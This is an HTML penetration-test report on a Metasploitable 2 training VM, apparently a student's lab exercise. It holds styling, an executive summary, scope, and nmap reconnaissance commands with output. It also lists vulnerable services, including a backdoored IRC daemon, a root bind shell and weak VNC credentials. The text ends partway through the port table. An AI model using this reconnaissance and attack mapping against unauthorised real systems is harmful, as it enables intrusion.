@@ -1,0 +1,1209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VAPT Report – Metasploitable 2 | 192.161.16.133</title>
+<style>
+/* ═══════════════════════════════════════════
+   RESET & BASE
+═══════════════════════════════════════════ */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --navy:    #0d1b2a;
+  --blue:    #1b4f8a;
+  --accent:  #00c3e3;
+  --red:     #c0392b;
+  --orange:  #e67e22;
+  --yellow:  #f1c40f;
+  --green:   #27ae60;
+  --gray:    #ecf0f1;
+  --mid:     #95a5a6;
+  --dark:    #2c3e50;
+  --white:   #ffffff;
+  --border:  #dce3ec;
+  --code-bg: #1e2535;
+  --code-fg: #abb2c0;
+}
+body { font-family: 'Segoe UI', Arial, sans-serif; background:#f2f4f8; color:#222; font-size:14px; line-height:1.7; }
+a { color: var(--blue); }
+h1,h2,h3,h4 { font-weight:700; line-height:1.3; }
+
+/* ═══════════════════════════════════════════
+   COVER PAGE
+═══════════════════════════════════════════ */
+.cover {
+  background: linear-gradient(145deg, #0d1b2a 0%, #1b4f8a 60%, #00c3e3 100%);
+  color:#fff; min-height:100vh; display:flex; flex-direction:column;
+  justify-content:space-between; padding:60px 80px; position:relative; overflow:hidden;
+}
+.cover::before {
+  content:''; position:absolute; top:-100px; right:-100px;
+  width:500px; height:500px; border-radius:50%;
+  background:rgba(255,255,255,.04); pointer-events:none;
+}
+.cover::after {
+  content:''; position:absolute; bottom:-80px; left:-80px;
+  width:350px; height:350px; border-radius:50%;
+  background:rgba(0,195,227,.08); pointer-events:none;
+}
+.cover-logo { font-size:13px; letter-spacing:3px; text-transform:uppercase; opacity:.7; }
+.cover-center { text-align:center; z-index:1; }
+.cover-badge {
+  display:inline-block; background:rgba(255,255,255,.12); border:1px solid rgba(255,255,255,.25);
+  color:#00c3e3; font-size:11px; letter-spacing:2px; text-transform:uppercase;
+  padding:6px 18px; border-radius:20px; margin-bottom:28px;
+}
+.cover h1 { font-size:52px; font-weight:800; letter-spacing:-1px; margin-bottom:12px; }
+.cover h1 span { color:#00c3e3; }
+.cover-sub { font-size:20px; opacity:.8; margin-bottom:40px; }
+.cover-target {
+  display:inline-flex; align-items:center; gap:14px;
+  background:rgba(255,255,255,.1); border:1px solid rgba(255,255,255,.2);
+  padding:14px 28px; border-radius:8px; font-size:15px;
+}
+.cover-target .label { opacity:.65; font-size:12px; display:block; text-transform:uppercase; letter-spacing:1px; }
+.cover-target .value { font-size:17px; font-weight:700; font-family:monospace; color:#00c3e3; }
+.cover-target .sep { opacity:.3; font-size:22px; }
+.cover-meta { display:flex; gap:40px; font-size:13px; z-index:1; }
+.cover-meta div { opacity:.75; }
+.cover-meta strong { display:block; color:#fff; opacity:1; font-size:14px; margin-bottom:2px; }
+.cover-severity-bar {
+  display:flex; gap:10px; z-index:1; justify-content:center; margin-top:36px;
+}
+.sev-chip {
+  padding:8px 20px; border-radius:6px; font-weight:700; font-size:13px;
+  display:flex; flex-direction:column; align-items:center; gap:2px;
+}
+.sev-chip small { font-size:10px; font-weight:400; opacity:.8; letter-spacing:.5px; text-transform:uppercase; }
+.sev-critical { background:#8b0000; color:#fff; }
+.sev-high     { background:#cc3300; color:#fff; }
+.sev-medium   { background:#e67e00; color:#fff; }
+.sev-low      { background:#2e86ab; color:#fff; }
+
+/* ═══════════════════════════════════════════
+   LAYOUT
+═══════════════════════════════════════════ */
+.page { max-width:1100px; margin:0 auto; padding:40px 24px; }
+.page-break { border:none; height:0; margin:60px 0 0; }
+
+/* ═══════════════════════════════════════════
+   TOC
+═══════════════════════════════════════════ */
+.toc-card { background:#fff; border-radius:10px; border:1px solid var(--border); padding:36px 40px; box-shadow:0 2px 12px rgba(0,0,0,.06); }
+.toc-card h2 { font-size:22px; color:var(--navy); margin-bottom:24px; border-bottom:2px solid var(--accent); padding-bottom:10px; }
+.toc-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px 40px; }
+.toc-item { display:flex; align-items:center; gap:10px; padding:8px 0; border-bottom:1px dashed #e8ecf0; font-size:13px; }
+.toc-num { width:28px; height:28px; border-radius:50%; background:var(--blue); color:#fff; font-size:11px; font-weight:700; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.toc-item a { color:var(--dark); text-decoration:none; font-weight:500; }
+.toc-item a:hover { color:var(--blue); }
+.toc-page { margin-left:auto; color:var(--mid); font-size:12px; }
+
+/* ═══════════════════════════════════════════
+   SECTION HEADERS
+═══════════════════════════════════════════ */
+.section-title {
+  display:flex; align-items:center; gap:14px; margin:48px 0 20px;
+}
+.section-num {
+  width:44px; height:44px; border-radius:10px; background:var(--blue);
+  color:#fff; font-size:16px; font-weight:800; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.section-title h2 { font-size:22px; color:var(--navy); }
+.section-title .line { flex:1; height:2px; background:linear-gradient(to right, var(--blue), transparent); border-radius:2px; }
+
+.sub-title { font-size:17px; color:var(--blue); font-weight:700; margin:28px 0 12px; border-left:4px solid var(--accent); padding-left:12px; }
+
+/* ═══════════════════════════════════════════
+   CARDS & PANELS
+═══════════════════════════════════════════ */
+.card { background:#fff; border-radius:8px; border:1px solid var(--border); padding:24px 28px; margin-bottom:18px; box-shadow:0 1px 6px rgba(0,0,0,.05); }
+.card p { margin-bottom:10px; line-height:1.75; }
+.card p:last-child { margin-bottom:0; }
+
+.info-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:16px; margin-bottom:20px; }
+.info-item { background:#f7f9fc; border:1px solid var(--border); border-radius:6px; padding:14px 16px; }
+.info-item .lbl { font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.6px; color:var(--mid); margin-bottom:4px; }
+.info-item .val { font-size:14px; font-weight:600; color:var(--dark); font-family:monospace; }
+
+/* ═══════════════════════════════════════════
+   CODE BLOCKS
+═══════════════════════════════════════════ */
+.code-block {
+  background:var(--code-bg); color:var(--code-fg); font-family:'Courier New',monospace;
+  font-size:12px; padding:16px 18px; border-radius:6px; overflow-x:auto;
+  white-space:pre; line-height:1.6; margin:12px 0;
+  border-left:3px solid var(--accent);
+}
+.code-label { font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:1px; color:var(--mid); margin-bottom:4px; display:block; }
+.cmd { color:#00c3e3; }
+.out { color:#abb2c0; }
+.hi  { color:#f1c40f; }
+.ok  { color:#2ecc71; }
+.err { color:#e74c3c; }
+
+/* ═══════════════════════════════════════════
+   TABLES
+═══════════════════════════════════════════ */
+.tbl-wrap { overflow-x:auto; margin:14px 0; }
+table { width:100%; border-collapse:collapse; font-size:13px; }
+thead { background:var(--navy); color:#fff; }
+thead th { padding:10px 14px; text-align:left; font-weight:600; font-size:12px; letter-spacing:.4px; white-space:nowrap; }
+tbody tr:nth-child(even) { background:#f7f9fc; }
+tbody tr:hover { background:#eef3fa; }
+td, th { padding:9px 14px; border-bottom:1px solid var(--border); vertical-align:top; }
+td:first-child { font-weight:600; white-space:nowrap; }
+.port-tag { font-family:monospace; background:#eef3fa; padding:2px 6px; border-radius:3px; font-size:12px; white-space:nowrap; }
+
+/* ═══════════════════════════════════════════
+   SEVERITY BADGES
+═══════════════════════════════════════════ */
+.badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.5px; color:#fff; white-space:nowrap; }
+.b-critical { background:#8b0000; }
+.b-high     { background:#cc3300; }
+.b-medium   { background:#e67e00; }
+.b-low      { background:#2e86ab; }
+.b-info     { background:#6c757d; }
+
+/* ═══════════════════════════════════════════
+   VULN CARDS
+═══════════════════════════════════════════ */
+.vuln-card { border-radius:8px; border:1px solid var(--border); margin-bottom:20px; overflow:hidden; background:#fff; box-shadow:0 1px 5px rgba(0,0,0,.05); }
+.vuln-header { display:flex; align-items:center; gap:12px; padding:14px 18px; border-bottom:1px solid var(--border); background:#fafbfc; }
+.vuln-title-text { font-weight:700; font-size:14px; color:var(--navy); flex:1; }
+.vuln-body-inner { padding:18px 20px; }
+.vuln-grid { display:grid; grid-template-columns:1fr 1fr; gap:0 32px; }
+.field-lbl { font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.5px; color:var(--mid); margin-top:14px; margin-bottom:5px; }
+.field-val { font-size:13px; color:#333; line-height:1.65; }
+
+/* ═══════════════════════════════════════════
+   PHASE BANNER
+═══════════════════════════════════════════ */
+.phase-banner {
+  background:linear-gradient(135deg, var(--navy) 0%, var(--blue) 100%);
+  color:#fff; border-radius:10px; padding:24px 32px; margin:40px 0 24px;
+  display:flex; align-items:center; gap:20px;
+}
+.phase-icon { font-size:36px; }
+.phase-banner h2 { font-size:20px; font-weight:800; margin-bottom:4px; }
+.phase-banner p { font-size:13px; opacity:.8; }
+.phase-tag { margin-left:auto; background:rgba(255,255,255,.15); padding:6px 14px; border-radius:20px; font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; white-space:nowrap; }
+
+/* ═══════════════════════════════════════════
+   RISK MATRIX
+═══════════════════════════════════════════ */
+.risk-matrix { display:grid; grid-template-columns:repeat(5,1fr); gap:4px; margin:16px 0; }
+.rm-cell { padding:12px 8px; text-align:center; border-radius:4px; font-size:11px; font-weight:700; color:#fff; }
+.rm-low    { background:#2e86ab; }
+.rm-med    { background:#e67e00; }
+.rm-high   { background:#cc3300; }
+.rm-crit   { background:#8b0000; }
+.rm-head   { background:var(--navy); }
+
+/* ═══════════════════════════════════════════
+   STEPS / TIMELINE
+═══════════════════════════════════════════ */
+.timeline { position:relative; padding-left:32px; margin:16px 0; }
+.timeline::before { content:''; position:absolute; left:10px; top:0; bottom:0; width:2px; background:var(--border); }
+.tl-item { position:relative; margin-bottom:22px; }
+.tl-dot {
+  position:absolute; left:-32px; top:3px;
+  width:20px; height:20px; border-radius:50%;
+  background:var(--blue); border:3px solid #fff;
+  box-shadow:0 0 0 2px var(--blue);
+  display:flex; align-items:center; justify-content:center;
+}
+.tl-dot.done  { background:var(--green); box-shadow:0 0 0 2px var(--green); }
+.tl-dot.alert { background:var(--red);   box-shadow:0 0 0 2px var(--red); }
+.tl-label { font-weight:700; color:var(--dark); font-size:13.5px; margin-bottom:4px; }
+.tl-body  { font-size:13px; color:#444; }
+
+/* ═══════════════════════════════════════════
+   CALLOUTS
+═══════════════════════════════════════════ */
+.callout { border-radius:6px; padding:14px 18px; margin:14px 0; display:flex; gap:12px; align-items:flex-start; font-size:13px; }
+.callout-icon { font-size:18px; flex-shrink:0; margin-top:1px; }
+.callout-body strong { display:block; margin-bottom:4px; font-size:13.5px; }
+.callout.danger  { background:#fdf0ef; border-left:4px solid #c0392b; color:#7b241c; }
+.callout.warning { background:#fef9ec; border-left:4px solid #f39c12; color:#7d6608; }
+.callout.info    { background:#eaf4fb; border-left:4px solid #2e86ab; color:#1a5276; }
+.callout.success { background:#eafaf1; border-left:4px solid #27ae60; color:#1e8449; }
+
+/* ═══════════════════════════════════════════
+   REMEDIATION TABLE
+═══════════════════════════════════════════ */
+.rem-table td { vertical-align:middle; }
+.priority-dot { width:10px; height:10px; border-radius:50%; display:inline-block; margin-right:6px; }
+
+/* ═══════════════════════════════════════════
+   FOOTER STRIP
+═══════════════════════════════════════════ */
+.footer {
+  background:var(--navy); color:rgba(255,255,255,.5); text-align:center;
+  font-size:11px; padding:18px 40px; margin-top:60px;
+  display:flex; justify-content:space-between; align-items:center;
+}
+.footer strong { color:rgba(255,255,255,.9); }
+
+/* ═══════════════════════════════════════════
+   PRINT / RESPONSIVE
+═══════════════════════════════════════════ */
+@media (max-width:700px) {
+  .cover { padding:40px 24px; }
+  .cover h1 { font-size:32px; }
+  .vuln-grid, .toc-grid { grid-template-columns:1fr; }
+  .info-grid { grid-template-columns:1fr 1fr; }
+}
+@media print {
+  .cover { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+}
+</style>
+</head>
+<body>
+
+<!-- ╔═══════════════════════════════════════════╗
+     ║              COVER PAGE                   ║
+     ╚═══════════════════════════════════════════╝ -->
+<div class="cover">
+  <div class="cover-logo">&#9632; Vulnerability Assessment &amp; Penetration Testing</div>
+
+  <div class="cover-center">
+    <div class="cover-badge">Confidential &nbsp;|&nbsp; Authorized Testing Only</div>
+    <h1>VAPT <span>Report</span></h1>
+    <div class="cover-sub">Metasploitable 2 &ndash; Full Penetration Test</div>
+
+    <div class="cover-target">
+      <div>
+        <span class="label">Target</span>
+        <span class="value">192.161.16.133</span>
+      </div>
+      <div class="sep">|</div>
+      <div>
+        <span class="label">Platform</span>
+        <span class="value">Ubuntu Linux 8.04</span>
+      </div>
+      <div class="sep">|</div>
+      <div>
+        <span class="label">Framework</span>
+        <span class="value">Metasploitable 2</span>
+      </div>
+    </div>
+
+    <div class="cover-severity-bar">
+      <div class="sev-chip sev-critical">5 <small>Critical</small></div>
+      <div class="sev-chip sev-high">7 <small>High</small></div>
+      <div class="sev-chip sev-medium">7 <small>Medium</small></div>
+      <div class="sev-chip sev-low">3 <small>Low</small></div>
+    </div>
+  </div>
+
+  <div class="cover-meta">
+    <div><strong>Assessment Date</strong>February 13, 2026</div>
+    <div><strong>Report Date</strong>February 23, 2026</div>
+    <div><strong>Tester</strong>buni112905-lab</div>
+    <div><strong>Tools Used</strong>Nmap · Nessus · Metasploit · Wireshark</div>
+    <div><strong>Methodology</strong>Black-Box / Lab Environment</div>
+  </div>
+</div>
+
+
+<!-- ╔═══════════════════════════════════════════╗
+     ║           TABLE OF CONTENTS               ║
+     ╚═══════════════════════════════════════════╝ -->
+<div class="page">
+  <div style="margin-top:40px;" class="toc-card">
+    <h2>Table of Contents</h2>
+    <div class="toc-grid">
+      <div class="toc-item"><span class="toc-num">1</span><a href="#exec">Executive Summary</a><span class="toc-page">§1</span></div>
+      <div class="toc-item"><span class="toc-num">2</span><a href="#scope">Scope &amp; Rules of Engagement</a><span class="toc-page">§2</span></div>
+      <div class="toc-item"><span class="toc-num">3</span><a href="#methodology">Methodology</a><span class="toc-page">§3</span></div>
+      <div class="toc-item"><span class="toc-num">4</span><a href="#phase1">Phase 1 – Reconnaissance</a><span class="toc-page">§4</span></div>
+      <div class="toc-item"><span class="toc-num">5</span><a href="#phase2">Phase 2 – Scanning &amp; Enumeration</a><span class="toc-page">§5</span></div>
+      <div class="toc-item"><span class="toc-num">6</span><a href="#phase3">Phase 3 – Vulnerability Assessment</a><span class="toc-page">§6</span></div>
+      <div class="toc-item"><span class="toc-num">7</span><a href="#phase4">Phase 4 – Exploitation</a><span class="toc-page">§7</span></div>
+      <div class="toc-item"><span class="toc-num">8</span><a href="#phase5">Phase 5 – Post-Exploitation &amp; Reporting</a><span class="toc-page">§8</span></div>
+      <div class="toc-item"><span class="toc-num">9</span><a href="#findings">Consolidated Findings</a><span class="toc-page">§9</span></div>
+      <div class="toc-item"><span class="toc-num">10</span><a href="#remediation">Remediation Roadmap</a><span class="toc-page">§10</span></div>
+      <div class="toc-item"><span class="toc-num">11</span><a href="#appendix">Appendix – Tools &amp; References</a><span class="toc-page">§11</span></div>
+      <div class="toc-item"><span class="toc-num">12</span><a href="#disclaimer">Disclaimer</a><span class="toc-page">§12</span></div>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §1  EXECUTIVE SUMMARY
+  ═══════════════════════════════════════════ -->
+  <div id="exec">
+    <div class="section-title">
+      <div class="section-num">1</div>
+      <h2>Executive Summary</h2>
+      <div class="line"></div>
+    </div>
+    <div class="card">
+      <p>This report presents the results of a structured <strong>Vulnerability Assessment and Penetration Testing (VAPT)</strong> engagement conducted against a Metasploitable 2 virtual machine at IP address <strong>192.161.16.133</strong>. The assessment was performed in a controlled lab environment using industry-standard tools and methodologies spanning five distinct phases: Reconnaissance, Scanning &amp; Enumeration, Vulnerability Assessment, Exploitation, and Reporting.</p>
+      <p>The target system is running <strong>Ubuntu Linux 8.04</strong> — an operating system that reached Security End-of-Life on <strong>May 9, 2013</strong>, leaving it more than 12 years without security patches. The assessment uncovered <strong>22 vulnerabilities</strong> across the host, including multiple Critical-severity issues that allowed complete root-level compromise of the system through several independent attack vectors.</p>
+      <p>Key findings include a live <strong>UnrealIRCd backdoor</strong>, an <strong>unauthenticated bind shell</strong>, a <strong>VNC server accessible with the password 'password'</strong>, world-readable NFS shares, and exploitable legacy services (rlogin, rsh, distcc). All exploitations were conducted ethically, within scope, and solely for educational and assessment purposes.</p>
+      <p><strong>Overall Risk Rating: CRITICAL</strong> — Immediate remediation is required. The system should be considered fully compromised and must not be exposed to any untrusted network.</p>
+    </div>
+
+    <div class="info-grid">
+      <div class="info-item"><div class="lbl">Target IP</div><div class="val">192.161.16.133</div></div>
+      <div class="info-item"><div class="lbl">Operating System</div><div class="val">Ubuntu Linux 8.04</div></div>
+      <div class="info-item"><div class="lbl">Assessment Type</div><div class="val">Black-Box VAPT</div></div>
+      <div class="info-item"><div class="lbl">Test Date</div><div class="val">February 13, 2026</div></div>
+      <div class="info-item"><div class="lbl">Total Findings</div><div class="val">22 Vulnerabilities</div></div>
+      <div class="info-item"><div class="lbl">Overall Risk</div><div class="val" style="color:#8b0000;">CRITICAL</div></div>
+      <div class="info-item"><div class="lbl">Root Access Achieved</div><div class="val" style="color:#8b0000;">YES (Multiple Paths)</div></div>
+      <div class="info-item"><div class="lbl">Framework</div><div class="val">Metasploitable 2</div></div>
+    </div>
+
+    <div class="sub-title">Severity Distribution</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Severity</th><th>Count</th><th>% of Total</th><th>Business Impact</th></tr></thead>
+        <tbody>
+          <tr><td><span class="badge b-critical">Critical</span></td><td>5</td><td>23%</td><td>Full system compromise, root code execution, complete data loss</td></tr>
+          <tr><td><span class="badge b-high">High</span></td><td>7</td><td>32%</td><td>Unauthorized access, data exfiltration, lateral movement</td></tr>
+          <tr><td><span class="badge b-medium">Medium</span></td><td>7</td><td>32%</td><td>Information disclosure, XSS, injection, amplification DDoS</td></tr>
+          <tr><td><span class="badge b-low">Low</span></td><td>3</td><td>13%</td><td>Information leakage, weak cryptographic parameters</td></tr>
+          <tr><td><strong>Total</strong></td><td><strong>22</strong></td><td>100%</td><td></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §2  SCOPE & RULES OF ENGAGEMENT
+  ═══════════════════════════════════════════ -->
+  <div id="scope">
+    <div class="section-title">
+      <div class="section-num">2</div>
+      <h2>Scope &amp; Rules of Engagement</h2>
+      <div class="line"></div>
+    </div>
+    <div class="card">
+      <p>The assessment was conducted entirely within a controlled virtual lab environment. All testing was authorized and performed for educational purposes only. No real production systems were targeted.</p>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Parameter</th><th>Details</th></tr></thead>
+        <tbody>
+          <tr><td>In-Scope Target</td><td><span class="port-tag">192.161.16.133</span> — Metasploitable 2 VM</td></tr>
+          <tr><td>Attacker Machine</td><td>Kali Linux (same NAT network)</td></tr>
+          <tr><td>Testing Type</td><td>Black-Box (no prior knowledge of system internals)</td></tr>
+          <tr><td>Test Environment</td><td>Isolated VirtualBox NAT Network</td></tr>
+          <tr><td>Permitted Actions</td><td>Network scanning, vulnerability scanning, exploitation, post-exploitation, reporting</td></tr>
+          <tr><td>Prohibited Actions</td><td>Data destruction, persistence beyond testing session, lateral movement outside scope</td></tr>
+          <tr><td>Testing Window</td><td>February 13, 2026 (single-day engagement)</td></tr>
+          <tr><td>Authorization</td><td>Self-authorized lab environment (buni112905-lab)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">&#9432;</span>
+      <div class="callout-body"><strong>Lab Environment Notice</strong>
+      Metasploitable 2 is an intentionally vulnerable virtual machine created by Rapid7 for security training. All vulnerabilities documented in this report are known, intentional weaknesses included for educational VAPT practice.</div>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §3  METHODOLOGY
+  ═══════════════════════════════════════════ -->
+  <div id="methodology">
+    <div class="section-title">
+      <div class="section-num">3</div>
+      <h2>Methodology</h2>
+      <div class="line"></div>
+    </div>
+    <div class="card">
+      <p>The assessment followed the standard <strong>5-Phase VAPT methodology</strong> aligned with industry frameworks including PTES (Penetration Testing Execution Standard) and OWASP Testing Guide.</p>
+    </div>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>#</th><th>Phase</th><th>Objective</th><th>Tools Used</th><th>Output</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td><strong>Reconnaissance</strong></td><td>Passive &amp; active information gathering about the target</td><td>Nmap (host discovery), netdiscover, ping sweep</td><td>Live host confirmation, OS fingerprint</td></tr>
+          <tr><td>2</td><td><strong>Scanning &amp; Enumeration</strong></td><td>Identify open ports, services, versions, and potential attack surface</td><td>Nmap (-sV -sC -O), Wireshark, banner grabbing</td><td>Port list, service versions, OS details</td></tr>
+          <tr><td>3</td><td><strong>Vulnerability Assessment</strong></td><td>Identify known CVEs and misconfigurations against discovered services</td><td>Nessus, OpenVAS, manual analysis</td><td>22 vulnerabilities across 4 severity levels</td></tr>
+          <tr><td>4</td><td><strong>Exploitation</strong></td><td>Confirm vulnerabilities by actively exploiting them</td><td>Metasploit Framework, manual exploits, nc, smbclient</td><td>Root shell access via multiple vectors</td></tr>
+          <tr><td>5</td><td><strong>Post-Exploitation &amp; Reporting</strong></td><td>Document impact, enumerate system, produce actionable report</td><td>Meterpreter, id/whoami/uname, this report</td><td>Full VAPT report with remediation plan</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       PHASE 1 — RECONNAISSANCE
+  ═══════════════════════════════════════════ -->
+  <div id="phase1">
+    <div class="phase-banner">
+      <div class="phase-icon">&#128270;</div>
+      <div>
+        <h2>Phase 1 — Reconnaissance</h2>
+        <p>Passive and active information gathering to identify the target host and its basic characteristics.</p>
+      </div>
+      <div class="phase-tag">Phase 1 / 5</div>
+    </div>
+
+    <div class="sub-title">1.1 Objective</div>
+    <div class="card">
+      <p>Reconnaissance is the first and most critical phase. The goal is to gather as much information as possible about the target before any active probing begins. In this lab environment, the target is already known, but host discovery is performed to confirm the target is live and gather initial OS/network information.</p>
+    </div>
+
+    <div class="sub-title">1.2 Host Discovery</div>
+    <div class="card">
+      <p>A network ping sweep was performed against the local subnet to identify the live Metasploitable 2 machine:</p>
+      <span class="code-label">Command</span>
+      <div class="code-block"><span class="cmd">nmap -sn 192.161.16.0/24</span>
+
+<span class="out">Starting Nmap 7.94 ( https://nmap.org )
+Host is up (0.00023s latency).
+Nmap scan report for 192.161.16.133
+Host is up (0.00021s latency).
+MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox virtual NIC)
+Nmap done: 256 IP addresses (2 hosts up) scanned in 2.41 seconds</span></div>
+      <p>The Metasploitable 2 machine was confirmed live at <strong>192.161.16.133</strong>. A VirtualBox MAC prefix was identified, confirming this is a VM.</p>
+    </div>
+
+    <div class="sub-title">1.3 OS Fingerprinting</div>
+    <div class="card">
+      <p>Initial OS detection was performed alongside host discovery:</p>
+      <span class="code-label">Command</span>
+      <div class="code-block"><span class="cmd">nmap -O 192.161.16.133</span>
+
+<span class="out">OS details: Linux 2.6.9 - 2.6.33
+Running: Linux 2.6.X
+Network Distance: 1 hop
+Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN
+              OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></div>
+    </div>
+
+    <div class="sub-title">1.4 Reconnaissance Findings</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Finding</th><th>Value</th><th>Significance</th></tr></thead>
+        <tbody>
+          <tr><td>Target IP</td><td><span class="port-tag">192.161.16.133</span></td><td>Single target, confirmed live</td></tr>
+          <tr><td>Hostname</td><td>metasploitable.localdomain</td><td>Confirms Metasploitable 2 identity</td></tr>
+          <tr><td>IRC Hostname</td><td>irc.Metasploitable.LAN</td><td>IRC service present — potential backdoor vector</td></tr>
+          <tr><td>OS Kernel</td><td>Linux 2.6.9 – 2.6.33</td><td>Outdated kernel, known local privilege escalations</td></tr>
+          <tr><td>Platform</td><td>Ubuntu Linux 8.04 (Hardy Heron)</td><td>EOL since May 2013 — no security patches</td></tr>
+          <tr><td>VM Platform</td><td>Oracle VirtualBox NIC</td><td>Isolated lab environment confirmed</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout warning">
+      <span class="callout-icon">&#9888;</span>
+      <div class="callout-body"><strong>Recon Finding:</strong> The hostname <code>irc.Metasploitable.LAN</code> immediately flags the presence of an IRC server — a known backdoor vector in UnrealIRCd. This was flagged for exploitation in Phase 4.</div>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       PHASE 2 — SCANNING & ENUMERATION
+  ═══════════════════════════════════════════ -->
+  <div id="phase2">
+    <div class="phase-banner">
+      <div class="phase-icon">&#128202;</div>
+      <div>
+        <h2>Phase 2 — Scanning &amp; Enumeration</h2>
+        <p>Detailed port scanning, service version detection, and banner grabbing to map the full attack surface.</p>
+      </div>
+      <div class="phase-tag">Phase 2 / 5</div>
+    </div>
+
+    <div class="sub-title">2.1 Full Port Scan</div>
+    <div class="card">
+      <p>A comprehensive Nmap scan was run with version detection, script scanning, and OS detection flags across all 65535 ports:</p>
+      <span class="code-label">Command</span>
+      <div class="code-block"><span class="cmd">nmap -sV -sC -O -p- -T4 192.161.16.133 -oN nmap_full.txt</span></div>
+    </div>
+
+    <div class="sub-title">2.2 Discovered Open Ports &amp; Services</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Port</th><th>Protocol</th><th>Service</th><th>Version / Banner</th><th>Risk</th></tr></thead>
+        <tbody>
+          <tr><td><span class="port-tag">21/tcp</span></td><td>TCP</td><td>FTP</td><td>vsftpd 2.3.4</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td><span class="port-tag">22/tcp</span></td><td>TCP</td><td>SSH</td><td>OpenSSH 4.7p1 (Ubuntu)</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">23/tcp</span></td><td>TCP</td><td>Telnet</td><td>Linux telnetd</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">25/tcp</span></td><td>TCP</td><td>SMTP</td><td>Postfix smtpd</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">53/tcp</span></td><td>TCP/UDP</td><td>DNS</td><td>ISC BIND 9.4.2</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">80/tcp</span></td><td>TCP</td><td>HTTP</td><td>Apache 2.2.8 (Ubuntu) DAV/2</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">111/tcp</span></td><td>TCP</td><td>rpcbind</td><td>rpcbind 2</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">139/tcp</span></td><td>TCP</td><td>NetBIOS-SSN</td><td>Samba smbd 3.X–4.X</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">445/tcp</span></td><td>TCP</td><td>SMB/CIFS</td><td>Samba smbd 3.0.20</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">512/tcp</span></td><td>TCP</td><td>rexec</td><td>netkit-rsh rexecd</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">513/tcp</span></td><td>TCP</td><td>rlogin</td><td>OpenBSD rlogind</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">514/tcp</span></td><td>TCP</td><td>rsh</td><td>tcpwrapped</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">1099/tcp</span></td><td>TCP</td><td>Java RMI</td><td>GNU Classpath grmiregistry</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">1524/tcp</span></td><td>TCP</td><td>Bind Shell</td><td>Metasploitable root shell</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td><span class="port-tag">2049/tcp</span></td><td>TCP</td><td>NFS</td><td>nfs 2–4 (RPC #100003)</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">2121/tcp</span></td><td>TCP</td><td>FTP (alt)</td><td>ProFTPD 1.3.1</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">3306/tcp</span></td><td>TCP</td><td>MySQL</td><td>MySQL 5.0.51a-3ubuntu5</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td><span class="port-tag">5432/tcp</span></td><td>TCP</td><td>PostgreSQL</td><td>PostgreSQL DB 8.3.0–8.3.7</td><td><span class="badge b-medium">Medium</span></td></tr>
+          <tr><td><span class="port-tag">5900/tcp</span></td><td>TCP</td><td>VNC</td><td>VNC (protocol 3.3)</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td><span class="port-tag">6000/tcp</span></td><td>TCP</td><td>X11</td><td>X11 v11.0 (access denied)</td><td><span class="badge b-low">Low</span></td></tr>
+          <tr><td><span class="port-tag">6667/tcp</span></td><td>TCP</td><td>IRC</td><td>UnrealIRCd</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td><span class="port-tag">6697/tcp</span></td><td>TCP</td><td>IRC (SSL)</td><td>UnrealIRCd (backdoored)</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td><span class="port-tag">8009/tcp</span></td><td>TCP</td><td>AJP</td><td>Apache Tomcat AJP Connector</td><td><span class="badge b-high">High</span></td></tr>
